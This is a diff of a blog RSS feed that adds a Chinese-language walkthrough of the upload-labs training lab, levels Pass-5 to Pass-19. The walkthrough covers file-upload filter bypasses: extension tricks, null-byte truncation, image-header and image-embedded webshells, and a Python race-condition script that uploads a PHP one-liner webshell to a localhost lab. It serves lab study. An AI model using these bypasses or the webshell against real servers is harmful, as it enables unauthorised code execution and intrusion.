@@ -5,8 +5,8 @@
     <description>Share my leaning。</description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
-    <pubDate>Fri, 12 Apr 2019 08:51:06 +0800</pubDate>
-    <lastBuildDate>Fri, 12 Apr 2019 08:51:06 +0800</lastBuildDate>
+    <pubDate>Fri, 12 Apr 2019 19:33:35 +0800</pubDate>
+    <lastBuildDate>Fri, 12 Apr 2019 19:33:35 +0800</lastBuildDate>
     <generator>Jekyll v3.8.5</generator>
     
       <item>
@@ -67,24 +67,185 @@ SetHandler application/x-httpd-php
 &lt;a href=&quot;https://i.loli.net/2019/04/09/5cac893e518c1.png&quot;&gt;&lt;img src=&quot;https://i.loli.net/2019/04/09/5cac893e518c1.png&quot; alt=&quot;屏幕快照 2019-04-09 19.53.36.png&quot; /&gt;&lt;/a&gt;
 上传成功后，上传图片马03.jpg ，运行成功  &lt;br /&gt;
 &lt;a href=&quot;https://i.loli.net/2019/04/09/5cac8971e083b.png&quot;&gt;&lt;img src=&quot;https://i.loli.net/2019/04/09/5cac8971e083b.png&quot; alt=&quot;屏幕快照 2019-04-09 19.55.50.png&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
-&lt;h2 id=&quot;pass-5-未区分大小写&quot;&gt;Pass-5 （未区分大小写）&lt;/h2&gt;
+&lt;h2 id=&quot;pass-5未区分大小写&quot;&gt;Pass-5（未区分大小写）&lt;/h2&gt;
 &lt;p&gt;Pass-4中存在以下代码：&lt;/p&gt;
 &lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;nv&quot;&gt;$file_ext&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;strtolower&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$file_ext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//转换为小写&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;而Pass-5中没有，说明Pass-5虽然过滤了所有的文件后缀，但是没有区分大小写。
 上传shell.PHP即可绕过&lt;/p&gt;
-&lt;h2 id=&quot;pass-6&quot;&gt;Pass-6&lt;/h2&gt;
+&lt;h2 id=&quot;pass-6文件名后缀空格&quot;&gt;Pass-6（文件名+后缀+空格）&lt;/h2&gt;
 &lt;p&gt;相比于第五关的过滤条件缺少了&lt;/p&gt;
 &lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;nv&quot;&gt;$file_ext&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;trim&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$file_ext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//首尾去空&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;所以通过构造文件名+后缀+空格进行绕过，即”shell.php “&lt;/p&gt;
-&lt;h2 id=&quot;pass-7&quot;&gt;Pass-7&lt;/h2&gt;
+&lt;h2 id=&quot;pass-7--shellphp&quot;&gt;Pass-7  （shell.php.）&lt;/h2&gt;
 &lt;p&gt;缺少”.”过滤代码：&lt;/p&gt;
 &lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$file_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;deldot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$file_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//删除文件名末尾的点&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;所以通过构造shell.php.进行绕过&lt;/p&gt;
-&lt;h2 id=&quot;pass-8&quot;&gt;Pass-8&lt;/h2&gt;
+&lt;p&gt;所以利用windows文件系统的文件名特性（windows系统上的文件名最后一个.会被去掉）通过构造shell.php.进行绕过&lt;/p&gt;
+&lt;h2 id=&quot;pass-8-data&quot;&gt;Pass-8 （::$DATA）&lt;/h2&gt;
+&lt;p&gt;Windows文件流特性绕过，文件名改成shell.php::$DATA，上传成功后保存的文件名其实是shell.php&lt;/p&gt;
+&lt;h2 id=&quot;pass-9--点空格点&quot;&gt;Pass-9  （点+空格+点）&lt;/h2&gt;
+&lt;p&gt;黑名单过滤，注意第15行和之前不太一样，路径拼接的是处理后的文件名，于是构造info.php. . （点+空格+点），经过处理后，文件名变成info.php.，即可绕过，经过windows文件系统的特性处理后即可上传访问成功。&lt;/p&gt;
+&lt;h2 id=&quot;pass-10--双写后缀名&quot;&gt;Pass-10  （双写后缀名）&lt;/h2&gt;
+&lt;p&gt;第8行代码存在上传漏洞：&lt;/p&gt;
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;：&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$deny_ext&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;php&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;php5&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;php4&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;php3&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;php2&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;html&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;htm&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;phtml&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;pht&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;jsp&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;jspa&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;jspx&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;jsw&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;jsv&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;jspf&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;jtml&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;asp&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;aspx&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;asa&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;asax&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;ascx&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;ashx&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;asmx&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;cer&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;swf&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;htaccess&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$file_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;trim&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_FILES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'upload_file'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'name'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
+&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$file_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str_ireplace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$deny_ext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$file_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;该代码的作用为将第六行中的$deny_ext中的后缀名替换为空。
+所以本题目可以使用双写后缀名的方法进行绕过。
+&lt;img src=&quot;https://i.loli.net/2019/04/12/5cafeae609ce6.png&quot; alt=&quot;屏幕快照 2019-04-12 09.29.58.png&quot; /&gt;&lt;/p&gt;
+&lt;h2 id=&quot;pass-11-00截断-00&quot;&gt;Pass-11 （00截断-%00）&lt;/h2&gt;
+&lt;p&gt;抓包上传发现，文件的命名格式是将路径与文件名连接起来进行上传
+&lt;a href=&quot;https://i.loli.net/2019/04/12/5cb066949f76d.png&quot;&gt;&lt;img src=&quot;https://i.loli.net/2019/04/12/5cb066949f76d.png&quot; alt=&quot;屏幕快照 2019-04-12 18.20.15.png&quot; /&gt;&lt;/a&gt;&lt;br /&gt;
+解题方法为：
+&lt;a href=&quot;https://i.loli.net/2019/04/12/5cb06c2b6b4ba.png&quot;&gt;&lt;img src=&quot;https://i.loli.net/2019/04/12/5cb06c2b6b4ba.png&quot; alt=&quot;屏幕快照 2019-04-12 18.44.22.png&quot; /&gt;&lt;/a&gt;
+讲道理这样就算上传成功了但是我遇到了些问题，可能服务器安全策略配置问题，放弃挣扎。
+&lt;a href=&quot;https://i.loli.net/2019/04/12/5cb06c2b1ae6a.png&quot;&gt;&lt;img src=&quot;https://i.loli.net/2019/04/12/5cb06c2b1ae6a.png&quot; alt=&quot;屏幕快照 2019-04-12 18.26.16.png&quot; /&gt;&lt;/a&gt;
+如果哪位大佬知道怎么回事可以评论告诉我&lt;/p&gt;
+&lt;h2 id=&quot;pass-12-00截断-0x00&quot;&gt;Pass-12 （00截断-0x00)&lt;/h2&gt;
+&lt;p&gt;同Pass-11 但是这次需要将%00换成空格，然后在hex选项卡中将20改为00&lt;/p&gt;
+&lt;h2 id=&quot;pass-13&quot;&gt;Pass-13&lt;/h2&gt;
+
+&lt;p&gt;绕过文件头检查，添加GIF图片的文件头&lt;code class=&quot;highlighter-rouge&quot;&gt;GIF89a&lt;/code&gt;，绕过GIF图片检查。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/13-1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;使用命令&lt;code class=&quot;highlighter-rouge&quot;&gt;copy normal.jpg /b + shell.php /a webshell.jpg&lt;/code&gt;，将php一句话追加到jpg图片末尾，代码不全的话，人工补充完整。形成一个包含Webshell代码的新jpg图片，然后直接上传即可。&lt;a href=&quot;https://github.com/LandGrey/upload-labs-writeup/blob/master/webshell/webshell.jpg&quot;&gt;JPG一句话shell参考示例&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/13-2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;png图片处理方式同上。&lt;a href=&quot;https://github.com/LandGrey/upload-labs-writeup/blob/master/webshell/webshell.png&quot;&gt;PNG一句话shell参考示例&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/13-3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;pass-14&quot;&gt;Pass-14&lt;/h2&gt;
+
+&lt;p&gt;原理和示例同&lt;strong&gt;Pass-13&lt;/strong&gt;，添加GIF图片的文件头绕过检查&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/14-1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;png图片webshell上传同&lt;strong&gt;Pass-13&lt;/strong&gt;。&lt;/p&gt;
+
+&lt;p&gt;jpg/jpeg图片webshell上传存在问题，正常的图片也上传不了，等待作者调整。&lt;/p&gt;
+
+&lt;h2 id=&quot;pass-15&quot;&gt;Pass-15&lt;/h2&gt;
+
+&lt;p&gt;原理同&lt;strong&gt;Pass-13&lt;/strong&gt;，添加GIF图片的文件头绕过检查&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/15-1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;png图片webshell上传同&lt;strong&gt;Pass-13&lt;/strong&gt;。&lt;/p&gt;
+
+&lt;p&gt;jpg/jpeg图片webshell上传同&lt;strong&gt;Pass-13&lt;/strong&gt;。&lt;/p&gt;
+
+&lt;h2 id=&quot;pass-16&quot;&gt;Pass-16&lt;/h2&gt;
+
+&lt;p&gt;原理：将一个正常显示的图片，上传到服务器。寻找图片被渲染后与原始图片部分对比仍然相同的数据块部分，将Webshell代码插在该部分，然后上传。具体实现需要自己编写Python程序，人工尝试基本是不可能构造出能绕过渲染函数的图片webshell的。&lt;/p&gt;
+
+&lt;p&gt;这里提供一个包含一句话webshell代码并可以绕过PHP的imagecreatefromgif函数的GIF图片&lt;a href=&quot;https://github.com/LandGrey/upload-labs-writeup/blob/master/webshell/bypass-imagecreatefromgif-pass-00.gif&quot;&gt;示例&lt;/a&gt;。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/16-1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;打开被渲染后的图片，Webshell代码仍然存在&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/16-2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;提供一个jpg格式图片绕过imagecreatefromjpeg函数渲染的一个&lt;a href=&quot;https://github.com/LandGrey/upload-labs-writeup/blob/master/webshell/bypass-imagecreatefromjpeg-pass-LandGrey.jpg&quot;&gt;示例文件&lt;/a&gt;。 直接上传示例文件会触发Warning警告，并提示文件不是jpg格式的图片。但是实际上已经上传成功，而且示例文件名没有改变。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/16-3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/16-4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;从上面上传jpg图片可以看到我们想复杂了，程序没有对渲染异常进行处理，直接在正常png图片内插入webshell代码，然后上传&lt;a href=&quot;https://github.com/LandGrey/upload-labs-writeup/blob/master/webshell/bypass-imagecreatefrompng-pass-LandGrey.png&quot;&gt;示例文件&lt;/a&gt;即可，并不需要图片是正常的图片。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/16-5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;程序依然没有对文件重命名，携带webshell的无效损坏png图片直接被上传成功。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/16-6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;pass-17&quot;&gt;Pass-17&lt;/h2&gt;
+
+&lt;p&gt;利用条件竞争删除文件时间差绕过。使用命令&lt;code class=&quot;highlighter-rouge&quot;&gt;pip install hackhttp&lt;/code&gt;安装&lt;a href=&quot;https://github.com/BugScanTeam/hackhttp&quot;&gt;hackhttp&lt;/a&gt;模块，运行下面的Python代码即可。如果还是删除太快，可以适当调整线程并发数。&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env python
+# coding:utf-8
+# Build By LandGrey
+&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;hackhttp&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;multiprocessing.dummy&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Pool&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ThreadPool&lt;/span&gt;
+
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;upload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lists&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;hh&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hackhttp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hackhttp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;raw&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;POST /upload-labs/Pass-17/index.php HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://127.0.0.1/upload-labs/Pass-17/index.php
+Cookie: pass=17
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: multipart/form-data; boundary=---------------------------6696274297634
+Content-Length: 341
+
+-----------------------------6696274297634
+Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;17.php&quot;
+Content-Type: application/octet-stream
+
+&amp;lt;?php assert($_POST[&quot;LandGrey&quot;])?&amp;gt;
+-----------------------------6696274297634
+Content-Disposition: form-data; name=&quot;submit&quot;
+
+上传
+-----------------------------6696274297634--
+&quot;&quot;&quot;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;html&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;redirect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hh&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'http://127.0.0.1/upload-labs/Pass-17/index.php'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;raw&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;raw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+
+&lt;span class=&quot;n&quot;&gt;pool&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ThreadPool&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;pool&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;upload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;pool&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;pool&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;在脚本运行的时候，访问Webshell&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/17-1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;pass-18&quot;&gt;Pass-18&lt;/h2&gt;
+
+&lt;p&gt;刚开始没有找到绕过方法，最后下载作者Github提供的打包环境，利用上传重命名竞争+Apache解析漏洞，成功绕过。&lt;/p&gt;
+
+&lt;p&gt;上传名字为&lt;code class=&quot;highlighter-rouge&quot;&gt;18.php.7Z&lt;/code&gt;的文件，快速重复提交该数据包，会提示文件已经被上传，但没有被重命名。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/18-1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;快速提交上面的数据包，可以让文件名字不被重命名上传成功。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/18-2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;然后利用Apache的解析漏洞，即可获得shell&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/18-3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;pass-19&quot;&gt;Pass-19&lt;/h2&gt;
+
+&lt;p&gt;原理同&lt;strong&gt;Pass-11&lt;/strong&gt;，上传的文件名用0x00绕过。改成&lt;code class=&quot;highlighter-rouge&quot;&gt;19.php【二进制00】.1.jpg&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/19-1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;后记&quot;&gt;后记&lt;/h2&gt;
+
+&lt;p&gt;可以发现以上绕过方法中有些是重复的，有些是意外情况，可能与项目作者的本意不符，故本文仅作为参考使用。&lt;/p&gt;
+
+&lt;p&gt;等作者修复代码逻辑后，本文也会适时更新。&lt;/p&gt;
 </description>
         <pubDate>Tue, 09 Apr 2019 04:49:43 +0800</pubDate>
         <link>http://localhost:4000/2019/04/09/uplodelabs.html</link>
